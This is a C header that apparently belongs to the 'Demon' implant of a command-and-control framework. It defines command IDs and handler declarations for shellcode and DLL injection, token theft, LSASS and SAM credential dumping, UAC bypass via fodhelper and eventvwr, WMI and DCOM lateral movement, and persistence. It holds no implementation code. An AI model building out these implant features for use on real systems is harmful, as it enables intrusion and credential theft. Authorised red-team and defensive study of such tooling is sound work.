#ifndef DEMON_COMMAND_H
#define DEMON_COMMAND_H

#include <core/Parser.h>

/* Commands */
#define DEMON_COMMAND_CHECKIN                   100
#define DEMON_COMMAND_GET_JOB                   1
#define DEMON_COMMAND_NO_JOB                    10
#define DEMON_COMMAND_SLEEP                     11
#define DEMON_COMMAND_PROC                      0x1010
#define DEMON_COMMAND_PROC_LIST                 12
#define DEMON_COMMAND_FS                        15
#define DEMON_COMMAND_INLINE_EXECUTE            20
#define DEMON_COMMAND_JOB                       21
#define DEMON_COMMAND_INJECT_DLL                22
#define DEMON_COMMAND_INJECT_SHELLCODE          24
#define DEMON_COMMAND_SPAWN_DLL                 26
#define DEMON_COMMAND_TOKEN                     40
#define DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE   0x2001
#define DEMON_COMMAND_ASSEMBLY_VERSIONS         0x2003
#define DEMON_COMMAND_NET                       2100
#define DEMON_COMMAND_CONFIG                    2500
#define DEMON_COMMAND_SCREENSHOT                2510
#define DEMON_COMMAND_PIVOT                     2520
#define DEMON_COMMAND_TRANSFER                  2530
#define DEMON_COMMAND_SOCKET                    2540
#define DEMON_COMMAND_KERBEROS                  2550
#define DEMON_COMMAND_MEM_FILE                  2560
#define DEMON_PACKAGE_DROPPED                   2570
#define DEMON_PACKAGE_FRAGMENT                  2580

/* [HVC-032] New command groups — allocated in blocks of 10 */
#define DEMON_COMMAND_LATERAL                   2600   /* lateral movement group   */
#define DEMON_COMMAND_PERSIST                   2610   /* persistence group        */
#define DEMON_COMMAND_CREDS                     2620   /* credential access group  */
#define DEMON_COMMAND_PRIVESC                   2630   /* privilege escalation     */

/* Lateral sub-commands */
#define DEMON_LATERAL_WMI_EXEC                  1
#define DEMON_LATERAL_DCOM_EXEC                 2

/* Persistence sub-commands */
#define DEMON_PERSIST_REG                       1
#define DEMON_PERSIST_SCHTASK                   2
#define DEMON_PERSIST_COM                       3
#define DEMON_PERSIST_REMOVE                    4

/* Remove type discriminators (used inside DEMON_PERSIST_REMOVE) */
#define DEMON_PERSIST_REMOVE_REG                1
#define DEMON_PERSIST_REMOVE_SCHTASK            2
#define DEMON_PERSIST_REMOVE_COM                3

/* Credential access sub-commands */
#define DEMON_CREDS_LSASS                       1
#define DEMON_CREDS_SAM                         2

/* Privilege escalation sub-commands */
#define DEMON_PRIVESC_UAC                       1

/* UAC bypass methods */
#define DEMON_PRIVESC_UAC_FODHELPER             1
#define DEMON_PRIVESC_UAC_COMPUTERDEFAULTS      2
#define DEMON_PRIVESC_UAC_EVENTVWR              3


#define DEMON_INFO                      89
#define DEMON_OUTPUT                    90
#define DEMON_ERROR                     91
#define DEMON_EXIT                      92
#define DEMON_KILL_DATE                 93
#define BEACON_OUTPUT                   94
#define DEMON_INITIALIZE                99

#define DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION        1
#define DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND 2
#define DEMON_COMMAND_INLINE_EXECUTE_RAN_OK           3
#define DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN     4

#define DOTNET_INFO_PATCHED             0x1
#define DOTNET_INFO_NET_VERSION         0x2
#define DOTNET_INFO_ENTRYPOINT_EXECUTED 0x3
#define DOTNET_INFO_FINISHED            0x4
#define DOTNET_INFO_FAILED              0x5

#define CALLBACK_ERROR_WIN32            0x1
#define CALLBACK_ERROR_COFFEXEC         0x2
#define CALLBACK_ERROR_TOKEN            0x3

// Config options
#define DEMON_CONFIG_SHOW_ALL                0

#define DEMON_CONFIG_IMPLANT_SLEEPMASK       1
#define DEMON_CONFIG_IMPLANT_SPFTHREADADDR   3
#define DEMON_CONFIG_IMPLANT_VERBOSE         4
#define DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE 5
#define DEMON_CONFIG_IMPLANT_COFFEE_THREADED 6
#define DEMON_CONFIG_IMPLANT_COFFEE_VEH      7

#define DEMON_CONFIG_MEMORY_ALLOC            101
#define DEMON_CONFIG_MEMORY_EXECUTE          102

#define DEMON_CONFIG_INJECTION_TECHNIQUE     150
#define DEMON_CONFIG_INJECTION_SPOOFADDR     151

#define DEMON_CONFIG_INJECTION_SPAWN64       152
#define DEMON_CONFIG_INJECTION_SPAWN32       153
#define DEMON_CONFIG_KILLDATE                154
#define DEMON_CONFIG_WORKINGHOURS            155

#define DEMON_NET_COMMAND_DOMAIN             1
#define DEMON_NET_COMMAND_LOGONS             2
#define DEMON_NET_COMMAND_SESSIONS           3
#define DEMON_NET_COMMAND_COMPUTER           4
#define DEMON_NET_COMMAND_DCLIST             5
#define DEMON_NET_COMMAND_SHARE              6
#define DEMON_NET_COMMAND_LOCALGROUP         7
#define DEMON_NET_COMMAND_GROUP              8
#define DEMON_NET_COMMAND_USER               9

#define DEMON_PIVOT_LIST                     1

#define DEMON_PIVOT_SMB_CONNECT              10
#define DEMON_PIVOT_SMB_DISCONNECT           11
#define DEMON_PIVOT_SMB_COMMAND              12

#define DEMON_INFO_MEM_ALLOC                 10
#define DEMON_INFO_MEM_EXEC                  11
#define DEMON_INFO_MEM_PROTECT               12
#define DEMON_INFO_PROC_CREATE               21

#define DEMON_CHECKIN_OPTION_PIVOTS          1

#define DEMON_COMMAND_JOB_LIST               1
#define DEMON_COMMAND_JOB_SUSPEND            2
#define DEMON_COMMAND_JOB_RESUME             3
#define DEMON_COMMAND_JOB_KILL_REMOVE        4
#define DEMON_COMMAND_JOB_DIED               5

#define DEMON_COMMAND_TRANSFER_LIST          0
#define DEMON_COMMAND_TRANSFER_STOP          1
#define DEMON_COMMAND_TRANSFER_RESUME        2
#define DEMON_COMMAND_TRANSFER_REMOVE        3

#define DEMON_COMMAND_PROC_MODULES           2
#define DEMON_COMMAND_PROC_GREP              3
#define DEMON_COMMAND_PROC_CREATE            4
#define DEMON_COMMAND_PROC_MEMORY            6
#define DEMON_COMMAND_PROC_KILL              7

#define DEMON_COMMAND_TOKEN_IMPERSONATE      1
#define DEMON_COMMAND_TOKEN_STEAL            2
#define DEMON_COMMAND_TOKEN_LIST             3
#define DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST 4
#define DEMON_COMMAND_TOKEN_MAKE             5
#define DEMON_COMMAND_TOKEN_GET_UID          6
#define DEMON_COMMAND_TOKEN_REVERT           7
#define DEMON_COMMAND_TOKEN_REMOVE           8
#define DEMON_COMMAND_TOKEN_CLEAR            9
#define DEMON_COMMAND_TOKEN_FIND_TOKENS      10

#define DEMON_COMMAND_FS_DIR                 1
#define DEMON_COMMAND_FS_DOWNLOAD            2
#define DEMON_COMMAND_FS_UPLOAD              3
#define DEMON_COMMAND_FS_CD                  4
#define DEMON_COMMAND_FS_REMOVE              5
#define DEMON_COMMAND_FS_MKDIR               6
#define DEMON_COMMAND_FS_COPY                7
#define DEMON_COMMAND_FS_MOVE                8
#define DEMON_COMMAND_FS_GET_PWD             9
#define DEMON_COMMAND_FS_CAT                 10


typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} DEMON_COMMAND ;

BOOL InWorkingHours( );
BOOL ReachedKillDate( );
VOID KillDate( );

/* dispatcher */
VOID CommandDispatcher( VOID );

/* commands */
VOID CommandCheckin(
    IN PPARSER Parser
);

VOID CommandSleep(
    IN PPARSER DataArgs
);

VOID CommandExit(
    IN PPARSER DataArgs
);

VOID CommandJob(
    IN PPARSER DataArgs
);

VOID CommandProc(
    IN PPARSER DataArgs
);

VOID CommandProcList(
    IN PPARSER DataArgs
);

VOID CommandFS(
    IN PPARSER DataArgs
);

VOID CommandInjectDLL(
    IN PPARSER DataArgs
);

VOID CommandInjectShellcode(
    IN PPARSER DataArgs
);

VOID CommandSpawnDLL(
    IN PPARSER DataArgs
);

VOID CommandInlineExecute(
    IN PPARSER DataArgs
);

VOID CommandAssemblyInlineExecute(
    IN PPARSER DataArgs
);

VOID CommandAssemblyListVersion(
    IN PPARSER Parser
);

VOID CommandScreenshot(
    IN PPARSER Parser
);

VOID CommandConfig(
    IN PPARSER Parser
);

VOID CommandNet(
    IN PPARSER Parser
);

VOID CommandToken(
    IN PPARSER Parser
);

VOID CommandPivot(
    IN PPARSER Parser
);

VOID CommandTransfer(
    IN PPARSER Parser
);

VOID CommandSocket(
    IN PPARSER Parser
);

VOID CommandKerberos(
    IN PPARSER Parser
);

VOID CommandMemFile(
    IN PPARSER Parser
);

/* [HVC-032] New command group handlers */
VOID CommandLateral(
    IN PPARSER DataArgs
);

VOID CommandPersist(
    IN PPARSER DataArgs
);

VOID CommandCreds(
    IN PPARSER DataArgs
);

VOID CommandPrivesc(
    IN PPARSER DataArgs
);


#endif
